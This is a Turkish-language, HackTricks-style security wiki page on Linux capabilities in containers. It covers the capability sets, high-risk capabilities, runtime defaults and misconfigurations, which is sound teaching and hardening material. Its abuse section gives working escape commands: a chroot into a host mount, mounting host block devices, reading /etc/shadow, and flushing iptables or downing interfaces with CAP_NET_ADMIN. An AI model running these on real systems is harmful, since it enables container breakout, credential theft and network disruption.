# Konteynerlerde Linux capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux capabilities, konteyner güvenliğinin en önemli parçalarından biridir çünkü ince ama temel bir soruya cevap verir: **bir konteyner içinde "root" gerçekten ne anlama gelir?** Normal bir Linux sisteminde UID 0 tarihsel olarak çok geniş bir ayrıcalık kümesini ifade ederdi. Modern çekirdeklerde bu ayrıcalık, capabilities olarak adlandırılan daha küçük birimlere ayrılmıştır. Bir süreç root olarak çalışıyor olabilir ancak ilgili capabilities kaldırıldıysa birçok güçlü işlemi gerçekleştiremeyebilir.

Konteynerler bu ayrımın üzerine çok dayanır. Birçok workload hâlâ uyumluluk veya basitlik nedenleriyle konteyner içinde UID 0 olarak başlatılır. capability dropping olmadan bu çok tehlikeli olurdu. capability dropping ile konteynerlenmiş root süreci, daha hassas kernel işlemleri engellenmişken bile birçok sıradan konteyner-içi görevi yerine getirebilir. Bu yüzden bir konteyner kabuğunda `uid=0(root)` yazması otomatik olarak "host root" veya geniş bir kernel ayrıcalığı anlamına gelmez. capability setleri, bu root kimliğinin gerçekte ne kadar değerli olduğunu belirler.

Tam Linux capability referansı ve birçok kötüye kullanım örneği için bakınız:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## İşleyiş

Capabilities, permitted, effective, inheritable, ambient ve bounding setleri dahil olmak üzere birkaç sette takip edilir. Birçok konteyner değerlendirmesinde, her bir setin tam kernel semantiği, şu anda daha acil olan nihai pratik soru kadar hemen önemli olmayabilir: **bu süreç şu anda hangi ayrıcalıklı işlemleri başarıyla gerçekleştirebilir ve gelecekte hangi ayrıcalık kazanımları hâlâ mümkün?**

Bunun önemi şuradan gelir: birçok breakout tekniği aslında konteyner problemleri olarak gizlenmiş capability problemleridir. `CAP_SYS_ADMIN`'e sahip bir workload, normal bir konteyner root sürecinin dokunmaması gereken çok geniş bir kernel işlevselliğine erişebilir. `CAP_NET_ADMIN`'e sahip bir workload, host network namespace'ini de paylaşıyorsa çok daha tehlikeli hale gelir. `CAP_SYS_PTRACE`'e sahip bir workload, host PID paylaşımı yoluyla host süreçlerini görebiliyorsa çok daha ilginç hale gelir. Docker veya Podman'da bu `--pid=host` olarak görünebilir; Kubernetes'te genelde `hostPID: true` olarak görünür.

Başka bir deyişle, capability seti izole olarak değerlendirilemez. Bu, namespaces, seccomp ve MAC policy ile birlikte okunmalıdır.

## Laboratuvar

Bir konteyner içinde capabilities'i incelemenin çok doğrudan bir yolu:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Ayrıca daha kısıtlayıcı bir container'ı tüm capabilities eklenmiş olanla karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Dar bir eklemenin etkisini görmek için, her şeyi kaldırıp yalnızca tek bir capability ekleyerek deneyin:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Bu küçük deneyler, bir runtime'ın yalnızca "privileged" adlı bir booleani açıp kapatmadığını göstermeye yardımcı olur. O, süreç için kullanılabilir gerçek ayrıcalık yüzeyini şekillendirir.

## Yüksek Riskli Yetkiler

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** savunucuların en şüpheyle yaklaşması gereken yetkidir. Genellikle "yeni root" olarak tanımlanır çünkü mount ile ilgili işlemler, namespace-bağlı davranışlar ve konteynerlere rastgele açılmaması gereken birçok kernel yolu dahil olmak üzere muazzam miktarda işlevselliğin kilidini açar. Bir konteynerde `CAP_SYS_ADMIN`, zayıf seccomp ve güçlü bir MAC confinement yoksa, birçok klasik kaçış yolu çok daha gerçekçi hale gelir.

**`CAP_SYS_PTRACE`** özellikle PID namespace host ile veya ilginç komşu workload'larla paylaşılıyorsa, süreç görünürlüğü olduğunda önem kazanır. Görünürlüğü müdahaleye dönüştürebilir.

**`CAP_NET_ADMIN`** ve **`CAP_NET_RAW`** ağ odaklı ortamlarda önemlidir. İzole bir bridge network üzerinde zaten riskli olabilirler; paylaşılan bir host network namespace üzerinde ise çok daha kötüdürler çünkü workload host ağını yeniden yapılandırabilir, sniff, spoof veya yerel trafik akışlarına müdahale edebilir.

**`CAP_SYS_MODULE`** genellikle rootful bir ortamda felaket niteliğindedir çünkü kernel modülleri yüklemek fiilen host-kernel kontrolüdür. Genel amaçlı bir container workload'ında neredeyse hiç görünmemelidir.

## Runtime Kullanımı

Docker, Podman, containerd-based stacks ve CRI-O hepsi capability kontrolleri kullanır, fakat varsayılanlar ve yönetim arayüzleri farklılık gösterir. Docker bunları `--cap-drop` ve `--cap-add` gibi flag'lerle çok doğrudan açığa çıkarır. Podman benzer kontroller sunar ve sıklıkla ek bir güvenlik katmanı olarak rootless execution'dan faydalanır. Kubernetes capability eklemelerini ve düşürmelerini Pod veya container `securityContext` üzerinden yüzeye çıkarır. LXC/Incus gibi system-container ortamları da yetki kontrolüne dayanır, ancak bu sistemlerin daha geniş host entegrasyonu operatörleri uygulama-container ortamlarına göre varsayılanları daha agresif şekilde gevşetmeye teşvik edebilir.

Aynı prensip hepsinde geçerlidir: teknik olarak vermek mümkün olan bir yetki, verilmesi gereken anlamına gelmez. Gerçek dünya olaylarının birçoğu, operatörün daha sıkı bir yapılandırmada workload başarısız olduğu için hızlı bir çözüm amacıyla bir yetki eklemesiyle başlar.

## Yanlış Yapılandırmalar

En bariz hata Docker/Podman tarzı CLI'larda **`--cap-add=ALL`** kullanmaktır, ama tek hata bu değildir. Pratikte daha yaygın bir sorun, özellikle `CAP_SYS_ADMIN` olmak üzere bir veya iki son derece güçlü yetkinin "uygulamanın çalışması için" verilmesi ve namespace, seccomp ve mount etkilerinin anlaşılamamasıdır. Diğer yaygın bir hata modu, ekstra yetkilerin host namespace paylaşımı ile birleştirilmesidir. Docker veya Podman'da bu `--pid=host`, `--network=host` veya `--userns=host` olarak görünebilir; Kubernetes'te eşdeğer maruziyet genellikle `hostPID: true` veya `hostNetwork: true` gibi workload ayarları aracılığıyla ortaya çıkar. Bu kombinasyonların her biri, yetkinin gerçekte neyi etkileyebileceğini değiştirir.

Ayrıca yöneticilerin bir workload tamamen `--privileged` olmadığı için hâlâ anlamlı şekilde kısıtlı olduğunu düşünmeleri sık karşılaşılan bir durumdur. Bazen bu doğrudur, ama bazen fiili duruş zaten privileged'e yeterince yakın olur ve ayrım operasyonel olarak önemsiz hale gelir.

## Kötüye Kullanım

İlk pratik adım, etkili yetki setini listelemek ve kaçış ya da host bilgi erişimi açısından önemli olabilecek yetkiye-özel eylemleri hemen test etmektir:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Eğer `CAP_SYS_ADMIN` mevcutsa, önce mount tabanlı kötüye kullanımları ve host dosya sistemi erişimini test edin, çünkü bu en yaygın breakout etkinleştiricilerinden biridir:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Eğer `CAP_SYS_PTRACE` mevcutsa ve container ilginç processes görebiliyorsa, bu capability'nin process inspection amacıyla kullanılıp kullanılamayacağını doğrula:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Eğer `CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa, workload'un görünen ağ yığını üzerinde değişiklik yapıp yapamayacağını veya en azından faydalı ağ istihbaratı toplayıp toplayamayacağını test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
When a capability test succeeds, combine it with the namespace situation. İzole bir namespace'te yalnızca riskli görünen bir capability, container ayrıca host PID, host network veya host mounts paylaşıyorsa hemen bir escape veya host-recon primitive haline gelebilir.

### Tam Örnek: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Eğer container'da `CAP_SYS_ADMIN` ve host dosya sisteminin `/host` gibi yazılabilir bir bind mount'u varsa, escape yolu genellikle basittir:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Eğer `chroot` başarılı olursa, komutlar artık host kök dosya sistemi bağlamında çalıştırılır:
```bash
id
hostname
cat /etc/shadow | head
```
Eğer `chroot` kullanılamıyorsa, aynı sonuca genellikle monte edilmiş ağaç üzerinden ikiliyi çağırarak ulaşılabilir:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Tam Örnek: `CAP_SYS_ADMIN` + Aygıt Erişimi

Eğer ana makinadan bir blok aygıt açığa çıkarıldıysa, `CAP_SYS_ADMIN` bunu doğrudan ana makinenin dosya sistemine erişim olarak kullanabilir:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Tam Örnek: `CAP_NET_ADMIN` + Host Ağ Erişimi

Bu kombinasyon her zaman doğrudan host root üretmeyebilir, ancak host ağ yığını tamamen yeniden yapılandırılabilir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu, denial of service, traffic interception veya daha önce filtrelenmiş servislere erişimi mümkün kılabilir.

## Checks

capability kontrollerinin amacı yalnızca ham değerleri dökmek değil; işlemin mevcut namespace ve mount durumunu tehlikeli hâle getirecek kadar ayrıcalığa sahip olup olmadığını anlamaktır.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Burada ilginç olanlar:

- `capsh --print` yüksek riskli yetenekleri tespit etmenin en kolay yoludur; örn. `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, veya `cap_sys_module`.
- `/proc/self/status` içindeki `CapEff` satırı, yalnızca diğer setlerde bulunabilecekleri değil, şu anda gerçekten etkili olanı gösterir.
- Eğer container ayrıca host PID, ağ veya kullanıcı namespace'lerini paylaşıyorsa veya yazılabilir host mount'ları varsa, bir capability dökümü çok daha önemli hale gelir.

Ham capability bilgilerini topladıktan sonra bir sonraki adım bunların yorumlanmasıdır. Sürecin root olup olmadığını, user namespaces'in aktif olup olmadığını, host namespace'lerinin paylaşılıp paylaşılmadığını, seccomp'un uygulayıcı konumda olup olmadığını ve AppArmor veya SELinux'un süreci hâlâ kısıtlayıp kısıtlamadığını sorun. Bir capability seti tek başına hikâyenin yalnızca bir parçasıdır, ancak genellikle bir container breakout'un neden işe yaradığını veya neden benzer bir başlangıç noktasına sahip başka birinin başarısız olduğunu açıklayan kısımdır.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak azaltılmış yetki seti | Docker, varsayılan bir allowlist (izin listesi) tutar ve geri kalan yetkileri düşürür | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Varsayılan olarak azaltılmış yetki seti | Podman konteynerleri varsayılan olarak ayrıcalıksızdır ve azaltılmış bir yetki modeli kullanır | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Değiştirilmedikçe runtime varsayılanlarını miras alır | Hiç `securityContext.capabilities` belirtilmemişse, konteyner runtime'dan gelen varsayılan yetki setini alır | `securityContext.capabilities.add`, `drop: [\"ALL\"]` yapılmaması, `privileged: true` |
| containerd / CRI-O under Kubernetes | Genellikle runtime varsayılanı | Etkili set, runtime ve Pod spesifikasyonuna bağlıdır | Kubernetes satırıyla aynı; doğrudan OCI/CRI konfigürasyonu da yetkileri açıkça ekleyebilir |

Kubernetes için önemli nokta, API'nin tek bir evrensel varsayılan yetki seti tanımlamıyor olmasıdır. Pod yetkileri eklemiyor veya düşürmüyorsa, workload o node'un runtime varsayılanını miras alır.
{{#include ../../../../banners/hacktricks-training.md}}
